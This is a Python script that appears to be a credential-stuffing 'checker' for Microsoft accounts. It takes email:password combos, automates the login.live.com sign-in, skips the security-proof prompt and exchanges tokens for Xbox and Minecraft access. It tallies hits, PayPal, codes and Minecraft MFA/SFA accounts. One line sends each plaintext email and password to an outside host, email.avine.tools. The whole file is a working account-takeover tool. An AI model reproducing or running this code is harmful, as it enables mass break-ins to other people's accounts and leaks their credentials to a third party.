import os, time, requests
from colorama import init, Fore

init(autoreset=True)

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"

class Headers:
    xboxacc = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Sec-GPC": "1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": USER_AGENT,
    }
    createxbox = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://account.xbox.com",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Sec-GPC": "1",
        "User-Agent": USER_AGENT,
        "X-Requested-With": "XMLHttpRequest"
    }
    default = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'document',
        'Accept-Encoding': 'identity',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': USER_AGENT,
    }
    login = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://login.live.com',
        'Referer': 'https://login.live.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': USER_AGENT,
    }
    privacy = {
        'authority': 'privacynotice.account.microsoft.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://login.live.com',
        'referer': 'https://login.live.com/',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'cross-site',
        'sec-gpc': '1',
        'upgrade-insecure-requests': '1',
        'user-agent': USER_AGENT,
    }
    precord = {
        'authority': 'privacynotice.account.microsoft.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.7',
        'origin': 'https://privacynotice.account.microsoft.com',
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'sec-gpc': '1',
        'user-agent': USER_AGENT,
    }
    notice = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.6',
        'Connection': 'keep-alive',
        'Referer': 'https://privacynotice.account.microsoft.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': USER_AGENT,
        'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Brave";v="114"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    midauth = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://login.live.com',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': USER_AGENT,
    }
    midauth2 = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.8',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Origin': 'https://login.live.com',
        'Referer': 'https://login.live.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': USER_AGENT,
    }
    payment = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.6',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Referer': 'https://login.live.com/',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': USER_AGENT,
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }
    order = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip,deflate,br',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Host': 'account.microsoft.com',
        'MS-CV': 'XeULpZy1H023MIm9.7.51',
        'Origin': 'https://login.live.com',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Sec-GPC': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': USER_AGENT
    }
    subs = {
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-GB,en;q=0.9,bn;q=0.8,en-US;q=0.7',
      'Connection': 'keep-alive',
      'Correlation-Context': 'v=1,ms.b.tel.market=en-US,ms.b.tel.scenario=ust.amc.services.amcserviceslanding,ms.c.ust.scenarioStep=AmcServicesLanding.Index',
      'MS-CV': 'MhZzfSVfVEGq++JF.33.59',
      'Referer': 'https://account.microsoft.com/services?lang=en-US',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': USER_AGENT,
      'X-Requested-With': 'XMLHttpRequest',
      'X-TzOffset': '360',
      'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
  }

    @staticmethod
    def update(header, dict2):
        header = header.copy()
        header.update(dict2)
        return header

def getinfo(s):
  
  headers = {
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'Accept-Language': 'en-GB,en;q=0.9',
      'Connection': 'keep-alive',
      'Referer': 'https://account.microsoft.com/services?lang=es-ES',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'same-origin',
      'Sec-Fetch-User': '?1',
      'Upgrade-Insecure-Requests': '1',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
      'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
  }
  
  params = {
      'lang': 'en-GB',
  }
  
  response = s.get('https://account.microsoft.com/profile', params=params, headers=headers)
  try: 
     vrf_token = response.text.split('<input name="__RequestVerificationToken" type="hidden" value="')[1].split('"')[0]
  except:
   raise Exception("Failed to get vrf token")

  headers = {
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-GB,en;q=0.9',
      'Connection': 'keep-alive',
      'Correlation-Context': 'v=1,ms.b.tel.market=es-ES',
      'MS-CV': 'CUTCcw5dYEGFVIJq.24.65',
      'Referer': 'https://account.microsoft.com/profile?lang=es-ES',
      'Sec-Fetch-Dest': 'empty',
      'Sec-Fetch-Mode': 'cors',
      'Sec-Fetch-Site': 'same-origin',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
      'X-Requested-With': 'XMLHttpRequest',
      '__RequestVerificationToken': vrf_token,
      'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
  }

  response = s.get('https://account.microsoft.com/profile/api/v1/personal-info', headers=headers)
  return response.json()

def clear():
    if 'posix' in os.name:
        os.system("clear")
    else:
        os.system("cls")

import time
import os
from colorama import Fore, init

init(autoreset=True)

# Function to clear the terminal screen
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

text = r"""
$$$$$$$\        $$\ $$\       $$\   $$\                               
\__$$  __|       $$ |$$ |      $$$\  $$ |                              
   $$ | $$$$$$\  $$ |$$ |  $$\ $$$$\ $$ | $$$$$$\   $$$$$$\  $$$$$$$\  
   $$ | \____$$\ $$ |$$ | $$  |$$ $$\$$ |$$  __$$\ $$  __$$\ $$  __$$\ 
   $$ | $$$$$$$ |$$ |$$$$$$  / $$ \$$$$ |$$$$$$$$ |$$ /  $$ |$$ |  $$ |
   $$ |$$  __$$ |$$ |$$  _$$<  $$ |\$$$ |$$   ____|$$ |  $$ |$$ |  $$ |
   $$ |\$$$$$$$ |$$ |$$ | \$$\ $$ | \$$ |\$$$$$$$\ \$$$$$$  |$$ |  $$ |
   \__| \_______|\__|\__|  \__|\__|  \__| \_______| \______/ \__|  \__|  
"""


def screen(total, valid, invalid, checked, pm, pp, codes, xbox, balance, start, mccap, mfa, sfa, hit, refundable, totalsb, puri):
    remain = abs(total - checked)
  
    clear()
    txt = ""
    if mccap:
        txt = f"""
○ Minecraft Capture
   · Hits: {hit}
   · MFA: {mfa}
   · SFA: {sfa}
   · Total SkyBlock Coins: {totalsb}
"""
    print(f"""
{Fore.MAGENTA+text}{Fore.RESET}
○ {Fore.CYAN}Total Accounts: {total} ({checked}/{total})
○ {Fore.RED}Invalid: {invalid}
○ {Fore.GREEN}Sexy Hits: {valid}
   · PP: {pp}
   · Xbox: {xbox}
   · Codes: {codes}
   · MC Codes: {0} (Available On Paid)
   · CoinBase: {0} (Available On Paid)
{txt} 
""")

def mcd(m):
  ua = USER_AGENT
  email, pswd = m.split(":")
  s = requests.session()
  headers = {
 'Accept':
 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
 'Accept-Language': 'en-US,en;q=0.9',
 'Connection': 'keep-alive',
 'Sec-Fetch-Dest': 'document',
 'Accept-Encoding': 'identity',
 'Sec-Fetch-Mode': 'navigate',
 'Sec-Fetch-Site': 'none',
 'Sec-Fetch-User': '?1',
 'Sec-GPC': '1',
 'Upgrade-Insecure-Requests': '1',
 'User-Agent': ua,
}

  while True:
      try:
          response = s.get('https://login.live.com/oauth20_authorize.srf?client_id=000000004C12AE6F&scope=service::user.auth.xboxlive.com::MBI_SSL&response_type=token&redirect_uri=https://login.live.com/oauth20_desktop.srf',
                     headers=headers,
                     timeout=20).text
          break
      except Exception as e:
          continue
  try:
      ppft = response.split(
   ''''<input type="hidden" name="PPFT" id="i0327" value="''')[1].split('"')[0]
      log_url = response.split(",urlPost:'")[1].split("'")[0]
  except:
      print("[-] Unknown Error (Proxies probably banned)")
      return
  log_data = f'i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={pswd}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i19=449894'
  headers = {
 'Accept':
 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
 'Accept-Language': 'en-US,en;q=0.9',
 'Cache-Control': 'max-age=0',
 'Connection': 'keep-alive',
 'Content-Type': 'application/x-www-form-urlencoded',
 'Origin': 'https://login.live.com',
 'Referer': 'https://login.live.com/',
 'Sec-Fetch-Dest': 'document',
 'Sec-Fetch-Mode': 'navigate',
 'Sec-Fetch-Site': 'same-origin',
 'Sec-Fetch-User': '?1',
 'Sec-GPC': '1',
 'Upgrade-Insecure-Requests': '1',
 'User-Agent': ua,
}
  while True:
      try:
          response = s.post(log_url, timeout=20, data=log_data, headers=headers)
          break
      except Exception as e:
          continue
  if 'https://account.live.com/proofs/Add' in response.text:
      headers = {
  'authority': 'account.live.com',
  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'accept-language': 'en-US,en;q=0.9',
  'cache-control': 'max-age=0',
  'content-type': 'application/x-www-form-urlencoded',
  'origin': 'https://login.live.com',
  'referer': 'https://login.live.com/',
  'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"',
  'sec-fetch-dest': 'document',
  'sec-fetch-mode': 'navigate',
  'sec-fetch-site': 'same-site',
  'upgrade-insecure-requests': '1',
  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
}
      ipt = response.text.split('id="ipt" value="')[1].split('"')[0]
      pprid = response.text.split('id="pprid" value="')[1].split('"')[0]
      uaid = response.text.split('id="uaid" value="')[1].split('"')[0]
      data = f'ipt={ipt}&pprid={pprid}&uaid={uaid}'
      fmHf = response.text.split('id="fmHF" action="')[1].split('"')[0]

      while True:
           try:
                response = s.post(fmHf,data=data,headers=headers)
                break
           except:
                continue
      headers = {
  'authority': 'account.live.com',
  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  'accept-language': 'en-US,en;q=0.8',
  'cache-control': 'max-age=0',
  'content-type': 'application/x-www-form-urlencoded',
  'origin': 'https://account.live.com',
  'referer': response.url,
  'sec-ch-ua': '"Chromium";v="112", "Brave";v="112", "Not:A-Brand";v="99"',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"',
  'sec-fetch-dest': 'document',
  'sec-fetch-mode': 'navigate',
  'sec-fetch-site': 'same-origin',
  'sec-fetch-user': '?1',
  'sec-gpc': '1',
  'upgrade-insecure-requests': '1',
  'user-agent': ua,
}


      data = {
  'iProofOptions': 'Email',
  'DisplayPhoneCountryISO': 'US',
  'DisplayPhoneNumber': '',
  'EmailAddress': '',
  'canary': response.text.split('id="canary" name="canary" value="')[1].split('"')[0],
  'action': 'Skip',
  'PhoneNumber': '',
  'PhoneCountryISO': '',
}

      while True:
          try:
              response = s.post(response.text.split('id="frmAddProof" method="post" action="')[1].split('"')[0], headers=headers, data=data)
              break
          except Exception as e:
              continue
  try:
      rpsTicket = response.url.split('access_token=')[1].split('&')[0]
  except:
      print('[-] Failed to get RPS token [invalid credentials]')
      return

  headers = {
  'Accept': '*/*',
  'Accept-Language': 'en-US,en;q=0.7',
  'Connection': 'keep-alive',
  'Origin': 'https://www.xbox.com',
  'Referer': 'https://www.xbox.com/',
  'Sec-Fetch-Dest': 'empty',
  'Sec-Fetch-Mode': 'cors',
  'Sec-Fetch-Site': 'cross-site',
  'Sec-GPC': '1',
  'User-Agent': ua,
  'content-type': 'application/json',
  'ms-cv': '6XHlfdK3HMhZEz8LfxSLAl.12',
  'sec-ch-ua': '"Chromium";v="112", "Brave";v="112", "Not:A-Brand";v="99"',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"',
  'x-xbl-contract-version': '1',
}

  json_data = {"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": rpsTicket}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}
  while True:
      try:
          response = s.post('https://user.auth.xboxlive.com/user/authenticate', headers=headers, json=json_data)
          break
      except Exception: continue

  xbox_token = response.json()['Token']
  headers = {
  'authority': 'xsts.auth.xboxlive.com',
  'accept': '*/*',
  'accept-language': 'en-US,en;q=0.7',
  'content-type': 'application/json',
  'ms-cv': 'u9Vh9cnctxQKKt3hYD1o37.22',
  'origin': 'https://www.xbox.com',
  'referer': 'https://www.xbox.com/',
  'sec-ch-ua': '"Chromium";v="112", "Brave";v="112", "Not:A-Brand";v="99"',
  'sec-ch-ua-mobile': '?0',
  'sec-ch-ua-platform': '"Windows"',
  'sec-fetch-dest': 'empty',
  'sec-fetch-mode': 'cors',
  'sec-fetch-site': 'cross-site',
  'sec-gpc': '1',
  'user-agent': ua,
  'x-xbl-contract-version': '1',
}

  json_data={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}

  while True:
      try:
          response = s.post('https://xsts.auth.xboxlive.com/xsts/authorize', headers=headers, json=json_data)
          break
      except:
          continue

  xsts = response.json()['Token']
  uhs = response.json()['DisplayClaims']['xui'][0]['uhs']
  xbl = f"XBL3.0 x={uhs};{xsts}"
  mc_login = s.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': xbl}, headers={'Content-Type': 'application/json'}, timeout=15)
  atk = mc_login.json().get("access_token")
  if atk:
    r = s.get('https://api.minecraftservices.com/minecraft/profile', headers={'Authorization': f'Bearer {atk}'}, verify=False)
    profile = r.json()
  else:
    profile = None
  mail_access = requests.get(f"https://email.avine.tools/check?email={email}&password={pswd}", verify=False)
  access = 'MFA' if mail_access.json()['Success'] == 1 else 'SFA'
  return {'profile': profile, 'access': access}

